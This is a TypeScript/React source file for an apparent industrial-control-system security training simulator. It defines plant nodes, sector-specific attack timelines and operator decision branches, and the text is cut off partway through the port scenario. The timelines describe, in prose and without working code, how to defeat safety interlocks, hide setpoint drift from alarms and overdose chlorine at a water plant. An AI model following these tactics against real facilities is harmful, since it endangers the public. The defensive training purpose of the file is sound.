import { createFileRoute, Link } from "@tanstack/react-router";
import { useCallback, useEffect, useMemo, useRef, useState, lazy, Suspense } from "react";
import facility from "@/assets/facility.jpg";
import { getSectorSchematic } from "@/data/schematics";
import { KaliTerminal, TerminalFAB } from "@/components/simulation/KaliTerminal";
import { Topology2D } from "@/components/simulation/Topology2D";
import { BlastRadiusHUD } from "@/components/simulation/BlastRadiusHUD";
import { AssetDossierTab } from "@/components/simulation/AssetDossierTab";
import { computeBlastRadius, type BlastRadiusResult } from "@/lib/simulation/blast-radius";
import { resolveSectorNode, translateSectorCommand } from "@/lib/simulation/sector-aliases";
import { MissionBriefing } from "@/components/simulation/MissionBriefing";
import { log } from "@/lib/logger";

const ExplainableAIPanel = lazy(() =>
  import("@/components/simulation/ExplainableAIPanel").then((m) => ({
    default: m.ExplainableAIPanel,
  })),
);
const AttackAnatomyPanel = lazy(() =>
  import("@/components/simulation/AttackAnatomyPanel").then((m) => ({
    default: m.AttackAnatomyPanel,
  })),
);
const SigmaRuleExport = lazy(() =>
  import("@/components/simulation/SigmaRuleExport").then((m) => ({ default: m.SigmaRuleExport })),
);
const PacketInspector = lazy(() =>
  import("@/components/simulation/PacketInspector").then((m) => ({ default: m.PacketInspector })),
);
const PhaseGuidancePanel = lazy(() =>
  import("@/components/simulation/PhaseGuidancePanel").then((m) => ({
    default: m.PhaseGuidancePanel,
  })),
);
const CVEIntelPanel = lazy(() =>
  import("@/components/simulation/CVEIntelPanel").then((m) => ({ default: m.CVEIntelPanel })),
);
const HaiReplayPanel = lazy(() =>
  import("@/components/simulation/HaiReplayPanel").then((m) => ({ default: m.HaiReplayPanel })),
);
const MitreIcsExplorerPanel = lazy(() =>
  import("@/components/simulation/MitreIcsExplorerPanel").then((m) => ({
    default: m.MitreIcsExplorerPanel,
  })),
);
const OtcadBrowserPanel = lazy(() =>
  import("@/components/simulation/OtcadBrowserPanel").then((m) => ({
    default: m.OtcadBrowserPanel,
  })),
);

function SimPanelFallback({ label }: { label: string }) {
  return (
    <div className="w-full min-h-[300px] border-2 border-rule bg-card flex flex-col items-center justify-center p-8 font-mono shadow-comic space-y-3">
      <div className="flex items-center gap-2 text-accent">
        <span className="size-2.5 bg-accent animate-ping" />
        <span className="text-xs font-bold uppercase tracking-wider">
          LOADING SUBSYSTEM: [{label}]
        </span>
      </div>
      <p className="text-[11px] text-muted-foreground uppercase tracking-widest">
        INITIALIZING PURDUE RANGE COMPONENT
      </p>
    </div>
  );
}
import { SimulationAuthGate } from "@/components/auth/SimulationAuthGate";
import { useOperator } from "@/contexts/OperatorContext";
import { usePreferences } from "@/lib/auth-store";
import { useGsapReveal } from "@/hooks/use-gsap-reveal";
import { getAttackScenario } from "@/simulation/scenarios";
import { EXERCISES, getScenarioData, type SectorId } from "@/data/scenarios";
import {
  exportRunLedgerJSON,
  exportRunLedgerCSV,
  exportRunLedgerReport,
  type RunLedgerData,
} from "@/lib/ledger-export";
import {
  evaluateSimulationState,
  type SimulationGraphState,
  type EnrichedEvent,
} from "@/lib/simulation-graph";
import { saveTrainingRun } from "@/lib/api/training.functions";
import { applyTwinCommandFn, startTwinSimulationFn } from "@/lib/api/simulation.functions";
import { saveGuestRun, canGuestDownloadPdf, recordGuestPdfDownload } from "@/lib/guest-store";
import { FileSpreadsheet, FileDown, Trophy, Shield } from "lucide-react";
import { generateSigmaRule, downloadSigmaRuleYml } from "@/lib/sigma-generator";
import {
  playAirGapRelaySound,
  playRadarPingSound,
  playTerminalKeySound,
  playBreakerTripAlert,
} from "@/lib/sound-engine";
import { getHistoricalAttackById } from "@/data/historical-attacks";

const SECTOR_IDS = [
  "power",
  "water",
  "oil-gas",
  "manufacturing",
  "port",
  "smart-building",
  "smart-city",
] as const;

export const Route = createFileRoute("/simulation")({
  validateSearch: (s: Record<string, unknown>): Partial<{ sector: SectorId; attack: string }> => ({
    sector:
      typeof s.sector === "string" && (SECTOR_IDS as readonly string[]).includes(s.sector)
        ? (s.sector as SectorId)
        : undefined,
    attack: typeof s.attack === "string" ? s.attack : undefined,
  }),
  head: () => ({
    meta: [
      { title: "Simulation — TwinSec · Live Exercise" },
      {
        name: "description",
        content:
          "Live cyber-physical simulation. Watch adversary propagation, physics drift, and operator decisions unfold in real time.",
      },
      { property: "og:title", content: "TwinSec — Live Simulation" },
      {
        property: "og:description",
        content: "Enter the control room. Rehearse the next incident at full physics.",
      },
    ],
  }),
  component: SimulationPage,
});

/* ------------------------------------------------------------------ */
/*  DATA                                                              */
/* ------------------------------------------------------------------ */

type Severity = "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";

type Node = {
  id: string;
  label: string;
  kind: string;
  x: number;
  y: number;
  ring: number;
  vendor: string;
  firmware: string;
  exposure: string;
  affects: string[];
};

type Edge = { from: string; to: string };

const NODES: Node[] = [
  {
    id: "ews-04",
    label: "EWS-04",
    kind: "Engineering Station",
    x: 8,
    y: 18,
    ring: 0,
    vendor: "DELL · WIN10 LTSC",
    firmware: "21H2-2042",
    exposure: "IT/L4",
    affects: ["Project files", "PLC programs"],
  },
  {
    id: "hist",
    label: "HIST-PI",
    kind: "Historian",
    x: 24,
    y: 36,
    ring: 1,
    vendor: "OSISOFT PI 2018",
    firmware: "3.4.420.X",
    exposure: "DMZ/L3.5",
    affects: ["Process telemetry", "Operator trends"],
  },
  {
    id: "hmi-11",
    label: "HMI-11",
    kind: "Operator Console",
    x: 22,
    y: 70,
    ring: 1,
    vendor: "WONDERWARE INTOUCH",
    firmware: "2020-R2",
    exposure: "OT/L2",
    affects: ["Operator view", "Alarm acknowledgement"],
  },
  {
    id: "switch-a",
    label: "SW-A",
    kind: "OT Switch",
    x: 42,
    y: 50,
    ring: 2,
    vendor: "HIRSCHMANN RSP-25",
    firmware: "9.1.04",
    exposure: "OT/L2",
    affects: ["VLAN OT-100", "VLAN SAFETY"],
  },
  {
    id: "plc-3",
    label: "PLC-3",
    kind: "Controller",
    x: 60,
    y: 28,
    ring: 3,
    vendor: "SIEMENS S7-1500",
    firmware: "4.2.11-rc3",
    exposure: "OT/L1",
    affects: ["Centrifuge CENT-Δ", "Bearing loop"],
  },
  {
    id: "plc-7",
    label: "PLC-7",
    kind: "Controller",
    x: 62,
    y: 72,
    ring: 3,
    vendor: "SIEMENS S7-1500",
    firmware: "4.2.11",
    exposure: "OT/L1",
    affects: ["Breaker BRK-33B", "Feeder pressure"],
  },
  {
    id: "sis",
    label: "SIS-LS",
    kind: "Safety Logic",
    x: 78,
    y: 50,
    ring: 4,
    vendor: "HIMA HIMax",
    firmware: "X-CPU 01 7.0",
    exposure: "SIS/L1",
    affects: ["Trip interlocks", "Vibration cutoff"],
  },
  {
    id: "cent",
    label: "CENT-Δ",
    kind: "Centrifuge",
    x: 92,
    y: 28,
    ring: 5,
    vendor: "GE-OEM 14MW",
    firmware: "—",
    exposure: "PHYSICAL/L0",
    affects: ["Rotor assembly", "Downstream feeder"],
  },
  {
    id: "brk",
    label: "BRK-33B",
    kind: "Breaker",
    x: 92,
    y: 72,
    ring: 5,
    vendor: "ABB SACE E2.2",
    firmware: "—",
    exposure: "PHYSICAL/L0",
    affects: ["14 MW load bank", "Sector-9 grid"],
  },
];

const EDGES: Edge[] = [
  { from: "ews-04", to: "hist" },
  { from: "ews-04", to: "hmi-11" },
  { from: "hist", to: "switch-a" },
  { from: "hmi-11", to: "switch-a" },
  { from: "switch-a", to: "plc-3" },
  { from: "switch-a", to: "plc-7" },
  { from: "plc-3", to: "sis" },
  { from: "plc-7", to: "sis" },
  { from: "plc-3", to: "cent" },
  { from: "plc-7", to: "brk" },
  { from: "sis", to: "cent" },
  { from: "sis", to: "brk" },
];

type Event = {
  t: number;
  tag: string;
  node: string;
  title: string;
  desc: string;
  sev: Severity;
  mitreId?: string;
};

// Default (power/HOLLOW) scenario — mutable so per-sector scenarios can swap in.
const EVENTS: Event[] = [
  {
    t: 0,
    tag: "INITIAL ACCESS",
    node: "ews-04",
    title: "Spear-phish accepted",
    desc: "Macro payload runs on engineering workstation EWS-04. Beacon established to attacker C2.",
    sev: "MEDIUM",
    mitreId: "T0817",
  },
  {
    t: 862,
    tag: "DISCOVERY",
    node: "hist",
    title: "Historian fingerprinted",
    desc: "OSIsoft PI node enumerated. 14 protocol anomalies on Modbus/TCP.",
    sev: "HIGH",
    mitreId: "T0846",
  },
  {
    t: 1244,
    tag: "LATERAL",
    node: "hmi-11",
    title: "HMI credential replay",
    desc: "Cached operator credentials reused. Unsegmented OT VLAN crossed in 6 seconds.",
    sev: "HIGH",
    mitreId: "T0886",
  },
  {
    t: 3731,
    tag: "STAGING",
    node: "switch-a",
    title: "Project file checked out",
    desc: "Engineering software opened. Project file staged for modification.",
    sev: "MEDIUM",
    mitreId: "T0877",
  },
  {
    t: 6489,
    tag: "IMPACT",
    node: "plc-3",
    title: "Ladder logic overwritten",
    desc: "Rungs 14–16 silently rewritten. Checksum spoofed. Operator does not know.",
    sev: "CRITICAL",
    mitreId: "T1692.001",
  },
  {
    t: 7820,
    tag: "IMPACT",
    node: "plc-7",
    title: "Setpoint drift initiated",
    desc: "Speed setpoint walked +0.3 Hz/s. Within tolerance band — invisible to alarm system.",
    sev: "CRITICAL",
    mitreId: "T0831",
  },
  {
    t: 9120,
    tag: "BYPASS",
    node: "sis",
    title: "Safety interlock bypassed",
    desc: "Safety logic solver re-tasked. Trip thresholds disarmed.",
    sev: "CRITICAL",
    mitreId: "T0837",
  },
  {
    t: 9520,
    tag: "PHYSICS",
    node: "cent",
    title: "Resonance band entered",
    desc: "Bearing temperature +84°C. Vibration crossed mechanical envelope.",
    sev: "CRITICAL",
    mitreId: "T0828",
  },
  {
    t: 9541,
    tag: "CONSEQUENCE",
    node: "brk",
    title: "Breaker 33-B latched",
    desc: "Cascading isolation. 14 MW load shed. Downstream pressure loss in feeder loop.",
    sev: "CRITICAL",
    mitreId: "T0879",
  },
];

const TOTAL = EVENTS[EVENTS.length - 1].t + 60;

/* ------------------------------------------------------------------ */
/*  DECISION BRANCHING                                                */
/* ------------------------------------------------------------------ */

type ChoiceId = "ACT" | "DEFER" | "MISS";

type Decision = {
  id: string;
  t: number;
  trigger: string;
  question: string;
  context: string;
  options: { id: ChoiceId; label: string; consequence: string }[];
};

const DECISIONS: Decision[] = [
  {
    id: "d1",
    t: 1244,
    trigger: "HMI credential replay",
    question: "Quarantine the historian and force operator re-auth on HMI-11?",
    context:
      "Modbus anomalies + cached credential reuse. Production halt risk if isolated mid-shift.",
    options: [
      {
        id: "ACT",
        label: "QUARANTINE",
        consequence: "Adversary loop broken at L3.5. SIS never reached. 0 MW shed.",
      },
      {
        id: "DEFER",
        label: "FLAG ONLY",
        consequence: "Adversary continues lateral movement. Detection at +14m too late.",
      },
      {
        id: "MISS",
        label: "DO NOTHING",
        consequence: "Full cascade. Outcome unchanged from baseline.",
      },
    ],
  },
  {
    id: "d2",
    t: 6489,
    trigger: "Ladder logic overwritten",
    question: "PLC-3 program checksum drift. Halt the controller?",
    context: "Operator dashboard nominal. Twin reports rung delta — SCADA does not.",
    options: [
      {
        id: "ACT",
        label: "FAIL-SAFE",
        consequence: "Controlled stop. Rotor protected. 2 MW deferred load.",
      },
      {
        id: "DEFER",
        label: "SCHEDULE WINDOW",
        consequence: "Drift widens. Resonance reached 47s later.",
      },
      { id: "MISS", label: "IGNORE", consequence: "Full physics impact retained." },
    ],
  },
  {
    id: "d3",
    t: 9120,
    trigger: "Safety interlock bypassed",
    question: "Twin reports SIS bypass invisible to SCADA. Manual trip?",
    context: "21 seconds until resonance band. Manual trip drops 14 MW immediately.",
    options: [
      {
        id: "ACT",
        label: "MANUAL TRIP",
        consequence: "Mechanical envelope preserved. Load shed reduced to 4 MW.",
      },
      {
        id: "DEFER",
        label: "REQUEST 2ND OPINION",
        consequence: "Window closes. Breaker latches as forecast.",
      },
      {
        id: "MISS",
        label: "TRUST SCADA",
        consequence: "Outcome unchanged. Maximum damage retained.",
      },
    ],
  },
];

/* ------------------------------------------------------------------ */
/*  PER-SECTOR SCENARIOS — distinct attack for every facility         */
/* ------------------------------------------------------------------ */

type Scenario = {
  nodeOverrides: Partial<Record<string, Partial<Node>>>;
  events: Event[];
  decisions: Decision[];
};

const DEFAULT_NODES = NODES.map((n) => ({ ...n }));
const DEFAULT_EVENTS = EVENTS.map((e) => ({ ...e }));
const DEFAULT_EDGES = EDGES.map((e) => ({ ...e }));
const DEFAULT_DECISIONS = DECISIONS.map((d) => ({
  ...d,
  options: d.options.map((o) => ({ ...o })),
}));

const SCENARIOS: Record<SectorId, Scenario> = {
  power: { nodeOverrides: {}, events: DEFAULT_EVENTS, decisions: DEFAULT_DECISIONS },

  water: {
    nodeOverrides: {
      "plc-3": {
        label: "PLC-DOSE",
        kind: "Dosing Controller",
        vendor: "ALLEN-BRADLEY CompactLogix",
        affects: ["Chlorine dose pump", "pH loop"],
      },
      "plc-7": {
        label: "PLC-PUMP",
        kind: "Pump Controller",
        vendor: "SCHNEIDER M580",
        affects: ["Distribution pump", "Reservoir level"],
      },
      sis: {
        label: "SIS-CL2",
        kind: "Chem Safety Logic",
        vendor: "TRICONEX Tricon v11",
        affects: ["Overdose interlock", "Tank isolation"],
      },
      cent: {
        label: "DOSE-A",
        kind: "Chlorine Injector",
        vendor: "GRUNDFOS DDA",
        affects: ["Basin-3 chlorine ppm", "Downstream mains"],
      },
      brk: {
        label: "PUMP-2B",
        kind: "Distribution Pump",
        vendor: "KSB Etanorm",
        affects: ["District pressure", "Reservoir draw"],
      },
    },
    events: [
      {
        t: 0,
        tag: "INITIAL ACCESS",
        node: "ews-04",
        title: "Vendor VPN token replayed",
        desc: "Stale contractor VPN session reused. Engineering laptop reached over site-to-site tunnel.",
        sev: "MEDIUM",
      },
      {
        t: 780,
        tag: "DISCOVERY",
        node: "hist",
        title: "SCADA historian mapped",
        desc: "OPC-UA browse enumerates dosing setpoints, basin turbidity tags, chlorine residuals.",
        sev: "HIGH",
      },
      {
        t: 1420,
        tag: "LATERAL",
        node: "hmi-11",
        title: "Operator console hijacked",
        desc: "RDP session opened during shift change. Alarms suppressed at the console.",
        sev: "HIGH",
      },
      {
        t: 3550,
        tag: "STAGING",
        node: "switch-a",
        title: "Historian trend spoof primed",
        desc: "Rolling replay buffer of nominal turbidity readings staged for injection.",
        sev: "MEDIUM",
      },
      {
        t: 6200,
        tag: "IMPACT",
        node: "plc-3",
        title: "Chlorine dose walked +6×",
        desc: "Setpoint driven from 1.2 ppm to 7.1 ppm in small deltas. Trend UI shows nominal — replayed.",
        sev: "CRITICAL",
      },
      {
        t: 7900,
        tag: "IMPACT",
        node: "plc-7",
        title: "Distribution pump forced ON",
        desc: "PUMP-2B held at 100% duty. Contaminated water pushed toward two districts.",
        sev: "CRITICAL",
      },
      {
        t: 9020,
        tag: "BYPASS",
        node: "sis",
        title: "Overdose interlock disarmed",
        desc: "TRICONEX safety trip re-tasked. Cl₂ high-high threshold suppressed.",
        sev: "CRITICAL",
      },
      {
        t: 9500,
        tag: "PHYSICS",
        node: "cent",
        title: "Basin-3 chlorine 8.4 ppm",
        desc: "Free chlorine breached WHO potable limit. Taste threshold crossed downstream.",
        sev: "CRITICAL",
      },
      {
        t: 9560,
        tag: "CONSEQUENCE",
        node: "brk",
        title: "Two districts on contaminated flow",
        desc: "17 000 service connections receiving off-spec water. Boil-water order triggered manually.",
        sev: "CRITICAL",
      },
    ],
    decisions: [
      {
        id: "d1",
        t: 1420,
        trigger: "Operator console hijacked",
        question: "Kill the RDP session and force MFA re-auth on HMI-11?",
        context:
          "Session originated from vendor VPN block. Shift change in progress — risk of missed alarms during lockout.",
        options: [
          {
            id: "ACT",
            label: "SEVER RDP",
            consequence:
              "Adversary loop broken at L2. Dosing setpoints never touched. 0 ppm drift.",
          },
          {
            id: "DEFER",
            label: "SHADOW & LOG",
            consequence: "Adversary continues. Detection arrives after 6× dose already delivered.",
          },
          {
            id: "MISS",
            label: "IGNORE",
            consequence: "Full contamination path. Boil-water order stands.",
          },
        ],
      },
      {
        id: "d2",
        t: 6200,
        trigger: "Chlorine dose walked +6×",
        question: "Twin reports dose drift; SCADA shows nominal. Force dosing pump to manual?",
        context:
          "Historian replay hides the drift. Manual override cuts residual disinfection for ~40 min.",
        options: [
          {
            id: "ACT",
            label: "MANUAL PUMP",
            consequence:
              "Drift stopped at 3.1 ppm. No health advisory. Chlorine deficit compensated downstream.",
          },
          {
            id: "DEFER",
            label: "SAMPLE FIRST",
            consequence: "Grab sample confirms 20 min later — dose already 6.4 ppm.",
          },
          {
            id: "MISS",
            label: "TRUST SCADA",
            consequence: "Peak dose 8.4 ppm reaches distribution.",
          },
        ],
      },
      {
        id: "d3",
        t: 9020,
        trigger: "Overdose interlock disarmed",
        question: "Isolate Basin-3 from distribution now?",
        context:
          "Reservoir buffer holds 90 min of demand. Isolation triggers pressure sag in two districts.",
        options: [
          {
            id: "ACT",
            label: "ISOLATE BASIN",
            consequence: "Contaminated water contained. Pressure sag managed via tanker draw.",
          },
          {
            id: "DEFER",
            label: "WAIT FOR LAB",
            consequence: "Lab confirms after distribution — advisory issued reactively.",
          },
          { id: "MISS", label: "HOLD", consequence: "Full 17 000-connection exposure." },
        ],
      },
    ],
  },

  "oil-gas": {
    nodeOverrides: {
      "plc-3": {
        label: "PLC-COMP",
        kind: "Compressor Controller",
        vendor: "EMERSON DeltaV M-series",
        affects: ["Discharge pressure", "Anti-surge loop"],
      },
      "plc-7": {
        label: "PLC-VLV",
        kind: "Valve Bank Controller",
        vendor: "YOKOGAWA CENTUM VP",
        affects: ["Flare header valve", "Overhead vapor"],
      },
      sis: {
        label: "SIS-OG",
        kind: "Safety Instrumented",
        vendor: "HIMA HIMax SIL-3",
        affects: ["Trip on 1050 psi", "ESD-1 hardwire"],
      },
      cent: {
        label: "TWR T-A",
        kind: "Distillation Tower",
        vendor: "REFINERY OEM",
        affects: ["Overhead pressure", "Reboiler feed"],
      },
      brk: {
        label: "FLARE",
        kind: "Flare Header",
        vendor: "JOHN ZINK",
        affects: ["Vent stack", "Emissions register"],
      },
    },
    events: [
      {
        t: 0,
        tag: "INITIAL ACCESS",
        node: "ews-04",
        title: "Trojanized engineering update",
        desc: "Signed installer swapped at mirror. YOKOGAWA config editor beacons out on first launch.",
        sev: "MEDIUM",
      },
      {
        t: 940,
        tag: "DISCOVERY",
        node: "hist",
        title: "DeltaV domain enumerated",
        desc: "ProfessionalPlus workstation trust exploited. Compressor tags catalogued.",
        sev: "HIGH",
      },
      {
        t: 1560,
        tag: "LATERAL",
        node: "hmi-11",
        title: "Console token replayed",
        desc: "Operator token from prior shift replayed. Anti-surge loop parameters read out.",
        sev: "HIGH",
      },
      {
        t: 3980,
        tag: "STAGING",
        node: "switch-a",
        title: "Anti-surge margin narrowed",
        desc: "Safe-envelope margin trimmed 18% on paper only. Live loop still nominal.",
        sev: "MEDIUM",
      },
      {
        t: 6700,
        tag: "IMPACT",
        node: "plc-3",
        title: "Compressor discharge walked",
        desc: "Setpoint pushed toward 1040 psi in +2 psi/60s creep. Below alarm threshold on every step.",
        sev: "CRITICAL",
      },
      {
        t: 8100,
        tag: "IMPACT",
        node: "plc-7",
        title: "Flare header valve throttled",
        desc: "Overhead relief path narrowed. Backpressure builds toward tower T-A.",
        sev: "CRITICAL",
      },
      {
        t: 9150,
        tag: "BYPASS",
        node: "sis",
        title: "SIL-3 trip disarmed",
        desc: "1050 psi high-high suppressed in the SIS. ESD-1 hardwire remains but is 22 min away by procedure.",
        sev: "CRITICAL",
      },
      {
        t: 9520,
        tag: "PHYSICS",
        node: "cent",
        title: "Tower T-A 1048 psi",
        desc: "Overhead vapor within 2 psi of relief. Bottoms temperature climbing.",
        sev: "CRITICAL",
      },
      {
        t: 9570,
        tag: "CONSEQUENCE",
        node: "brk",
        title: "Emergency flare — reportable",
        desc: "Manual ESD-1 pulled at 1049 psi. 4.2 t hydrocarbons flared. Regulator notification within 1 h.",
        sev: "CRITICAL",
      },
    ],
    decisions: [
      {
        id: "d1",
        t: 1560,
        trigger: "Console token replayed",
        question: "Revoke every operator token issued in last 12 h?",
        context:
          "Mass revocation forces re-auth mid-shift. Anti-surge loop supervision briefly single-operator.",
        options: [
          {
            id: "ACT",
            label: "REVOKE ALL",
            consequence: "Adversary loses console. Anti-surge margin never touched.",
          },
          {
            id: "DEFER",
            label: "REVOKE SUSPECT",
            consequence: "Adversary rotates to secondary token. Attack proceeds slower.",
          },
          { id: "MISS", label: "MONITOR", consequence: "Full compressor walk executes." },
        ],
      },
      {
        id: "d2",
        t: 6700,
        trigger: "Compressor discharge walked",
        question: "Twin flags 2 psi/60s creep. Force compressor to recycle?",
        context: "Recycle drops throughput 40% for 20 min. Downstream cracker sees feed dip.",
        options: [
          {
            id: "ACT",
            label: "RECYCLE",
            consequence: "Discharge held at 980 psi. Tower never approaches relief.",
          },
          {
            id: "DEFER",
            label: "TIGHTEN ALARM",
            consequence: "Alarm now trips at 1030 psi — 12 min of exposure remain.",
          },
          {
            id: "MISS",
            label: "IGNORE CREEP",
            consequence: "Full pressure walk continues to 1048 psi.",
          },
        ],
      },
      {
        id: "d3",
        t: 9150,
        trigger: "SIL-3 trip disarmed",
        question: "Pull ESD-1 hardwire trip now?",
        context:
          "Manual ESD flares ~4 t hydrocarbons and is a reportable event. Waiting risks tower relief.",
        options: [
          {
            id: "ACT",
            label: "ESD-1",
            consequence: "Controlled flare. Tower depressurized safely. No mechanical damage.",
          },
          {
            id: "DEFER",
            label: "CALL SUPT",
            consequence: "Two-minute delay. Overhead reaches 1050 psi relief valve.",
          },
          {
            id: "MISS",
            label: "TRUST SIS",
            consequence: "Uncontrolled relief. Damage to overhead condenser.",
          },
        ],
      },
    ],
  },

  manufacturing: {
    nodeOverrides: {
      "plc-3": {
        label: "VIS-CTL",
        kind: "Vision Controller",
        vendor: "COGNEX In-Sight D900",
        affects: ["Defect classifier", "Reject arm"],
      },
      "plc-7": {
        label: "PLC-LINE",
        kind: "Line Controller",
        vendor: "MITSUBISHI iQ-R",
        affects: ["Conveyor speed", "Torque tool"],
      },
      sis: {
        label: "SAFE-L",
        kind: "Safety Relay",
        vendor: "PILZ PSSu",
        affects: ["E-stop chain", "Light curtain"],
      },
      cent: {
        label: "ROBOT-4",
        kind: "Assembly Robot",
        vendor: "FANUC M-20iD",
        affects: ["Torque pattern", "Cycle time"],
      },
      brk: {
        label: "REJECT",
        kind: "Reject Diverter",
        vendor: "SICK deTem",
        affects: ["Bad-part chute", "Pallet build"],
      },
    },
    events: [
      {
        t: 0,
        tag: "INITIAL ACCESS",
        node: "ews-04",
        title: "MES developer laptop popped",
        desc: "Malicious VSCode extension side-loads a persistence agent on the MES developer host.",
        sev: "MEDIUM",
      },
      {
        t: 810,
        tag: "DISCOVERY",
        node: "hist",
        title: "Quality DB enumerated",
        desc: "SQL browse of quality DB reveals defect model version and confidence thresholds.",
        sev: "HIGH",
      },
      {
        t: 1380,
        tag: "LATERAL",
        node: "hmi-11",
        title: "Line HMI credential replay",
        desc: "Shared operator PIN reused. Reject-arm audit trail opened.",
        sev: "HIGH",
      },
      {
        t: 3620,
        tag: "STAGING",
        node: "switch-a",
        title: "Vision model swap staged",
        desc: "Alternate ONNX model uploaded to vision controller partition. Not yet active.",
        sev: "MEDIUM",
      },
      {
        t: 6300,
        tag: "IMPACT",
        node: "plc-3",
        title: "Vision model swapped mid-shift",
        desc: "Defect classifier replaced with permissive variant. Defective parts pass inspection.",
        sev: "CRITICAL",
      },
      {
        t: 7700,
        tag: "IMPACT",
        node: "plc-7",
        title: "Torque pattern drifted",
        desc: "Assembly torque profile shifted −8% on critical fasteners. Within OEM tolerance band on report.",
        sev: "CRITICAL",
      },
      {
        t: 9080,
        tag: "BYPASS",
        node: "sis",
        title: "Reject diverter disabled",
        desc: "PILZ safety relay reprogrammed to keep diverter retracted regardless of vision verdict.",
        sev: "CRITICAL",
      },
      {
        t: 9450,
        tag: "PHYSICS",
        node: "cent",
        title: "180 assemblies stacked",
        desc: "Three pallets of under-torqued assemblies accepted to finished goods.",
        sev: "CRITICAL",
      },
      {
        t: 9540,
        tag: "CONSEQUENCE",
        node: "brk",
        title: "Recall assembles itself",
        desc: "Downstream field failure statistically inevitable. Recall scope: 6 200 units already shipped.",
        sev: "CRITICAL",
      },
    ],
    decisions: [
      {
        id: "d1",
        t: 1380,
        trigger: "Line HMI credential replay",
        question: "Rotate every line PIN and force badge-tap re-auth?",
        context: "PIN rotation stalls line 6 min for badge re-issue. Shift metrics take a hit.",
        options: [
          {
            id: "ACT",
            label: "ROTATE PINS",
            consequence: "Adversary loses HMI. Vision model swap never completes.",
          },
          {
            id: "DEFER",
            label: "REQUIRE BADGE",
            consequence: "Adversary uses cached PIN once more. Swap staged but not activated.",
          },
          { id: "MISS", label: "IGNORE", consequence: "Full defect pass-through." },
        ],
      },
      {
        id: "d2",
        t: 6300,
        trigger: "Vision model swapped mid-shift",
        question: "Twin flags classifier hash drift. Roll back model now?",
        context: "Rollback stops line 4 min. QA needs to re-verify last 40 parts.",
        options: [
          {
            id: "ACT",
            label: "ROLLBACK",
            consequence: "Defective parts caught at reject arm. 40-part re-inspect only.",
          },
          {
            id: "DEFER",
            label: "GATE END-OF-LINE",
            consequence: "180 parts pass before EOL gate catches them.",
          },
          { id: "MISS", label: "TRUST MODEL", consequence: "Full recall inevitable." },
        ],
      },
      {
        id: "d3",
        t: 9080,
        trigger: "Reject diverter disabled",
        question: "Stop the line?",
        context:
          "Line stop costs $18k/min for 22 min recovery. Alternative: manual reject at chute.",
        options: [
          {
            id: "ACT",
            label: "LINE STOP",
            consequence: "Zero bad parts to finished goods. Recall averted.",
          },
          {
            id: "DEFER",
            label: "MANUAL REJECT",
            consequence: "Human error rate ~4%. Small recall (~30 units).",
          },
          { id: "MISS", label: "RIDE IT OUT", consequence: "Full 6 200-unit recall." },
        ],
      },
    ],
  },

  port: {
    nodeOverrides: {
      "plc-3": {
        label: "TOS-API",
        kind: "Terminal Ops API",
        vendor: "NAVIS N4",
        affects: ["Container manifest", "Yard allocation"],
      },
      "plc-7": {
        label: "CRANE-4",
        kind: "STS Crane PLC",
        vendor: "KALMAR SmartPort",
        affects: ["Spreader lock", "Trolley path"],
      },
      sis: {
        label: "REEFER",
        kind: "Reefer Power Ctrl",
        vendor: "ORBCOMM",
        affects: ["Reefer plug power", "Temp alarm"],
      },
      cent: {
        label: "BERTH-7",
        kind: "Berth Assignment",
        vendor: "TOS-DERIVED",
        affects: ["Vessel slot", "Pilot plan"],
      },
      brk: {
        label: "HAZMAT",
        kind: "IMDG Register",
        vendor: "TOS-DERIVED",
        affects: ["Dangerous goods slot", "Segregation table"],
      },
    },
    events: [
      {
        t: 0,
        tag: "INITIAL ACCESS",
        node: "ews-04",
        title: "Shipping agent portal phished",
        desc: "Freight forwarder credential harvested via lookalike domain. TOS web console reached.",
        sev: "MEDIUM",
      },
      {
        t: 720,
        tag: "DISCOVERY",
        node: "hist",
        title: "EDIFACT flows mapped",
        desc: "24 h of BAPLIE/COARRI messages enumerated. Reefer/hazmat identifiers indexed.",
        sev: "HIGH",
      },
      {
        t: 1300,
        tag: "LATERAL",
        node: "hmi-11",
        title: "Yard control console hijacked",
        desc: "Operator session reused. Manual overrides available.",
        sev: "HIGH",
      },
      {
        t: 3400,
        tag: "STAGING",
        node: "switch-a",
        title: "COPRAR replay primed",
        desc: "Batch of container-move messages staged with rewritten destinations.",
        sev: "MEDIUM",
      },
      {
        t: 6100,
        tag: "IMPACT",
        node: "plc-3",
        title: "Manifest destinations rewritten",
        desc: "220 containers reassigned across yard. Reefers land on dry stacks. Empties on live plugs.",
        sev: "CRITICAL",
      },
      {
        t: 7600,
        tag: "IMPACT",
        node: "plc-7",
        title: "Crane spreader lock forced",
        desc: "STS-4 spreader locked mid-move. Container swings; berth window collapses.",
        sev: "CRITICAL",
      },
      {
        t: 9000,
        tag: "BYPASS",
        node: "sis",
        title: "Reefer alarms suppressed",
        desc: "ORBCOMM reefer temperature alerts filtered. 90 boxes silently warm.",
        sev: "CRITICAL",
      },
      {
        t: 9420,
        tag: "PHYSICS",
        node: "cent",
        title: "Berth 7 congestion",
        desc: "Wrong-slot boxes block quay traffic. Vessel Delta-9 rolls to next tide.",
        sev: "CRITICAL",
      },
      {
        t: 9530,
        tag: "CONSEQUENCE",
        node: "brk",
        title: "Hazmat vanishes in yard",
        desc: "Two IMDG Class 3 boxes reassigned off-register. Located 6 h later inside general-cargo stack.",
        sev: "CRITICAL",
      },
    ],
    decisions: [
      {
        id: "d1",
        t: 1300,
        trigger: "Yard control console hijacked",
        question: "Freeze every manual override on the TOS?",
        context:
          "Freeze halts routine reef/hazmat exceptions. Yard planner works blind for ~20 min.",
        options: [
          {
            id: "ACT",
            label: "FREEZE OVERRIDES",
            consequence: "Adversary loses write path. No manifest rewrites executed.",
          },
          {
            id: "DEFER",
            label: "AUDIT NEW ONES",
            consequence: "Adversary submits rewrites as batch — audit flags them 8 min late.",
          },
          { id: "MISS", label: "MONITOR", consequence: "Full 220-box misallocation." },
        ],
      },
      {
        id: "d2",
        t: 6100,
        trigger: "Manifest destinations rewritten",
        question: "Halt all yard moves and reconcile from BAPLIE?",
        context: "Halt costs berth window. Reconciliation ~35 min.",
        options: [
          {
            id: "ACT",
            label: "HALT & RECONCILE",
            consequence: "Reefers replugged in 15 min. Hazmat register clean.",
          },
          {
            id: "DEFER",
            label: "SPOT-CHECK",
            consequence: "Spot check misses 40 boxes. Reefers warm for 90 min.",
          },
          { id: "MISS", label: "PROCEED", consequence: "Full yard chaos + hazmat loss." },
        ],
      },
      {
        id: "d3",
        t: 9000,
        trigger: "Reefer alarms suppressed",
